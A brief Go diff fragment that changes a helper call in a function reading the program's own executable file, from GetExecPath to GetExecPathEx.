@@ -15,7 +15,7 @@ func Hide(name string) {
 }
 
 func ReadMySelf() []byte {
-	path, _ := util.GetExecPath()
+	path, _ := util.GetExecPathEx()
 	f, err := ioutil.ReadFile(path)
 	if err != nil {
 		fmt.Println("read fail", err)
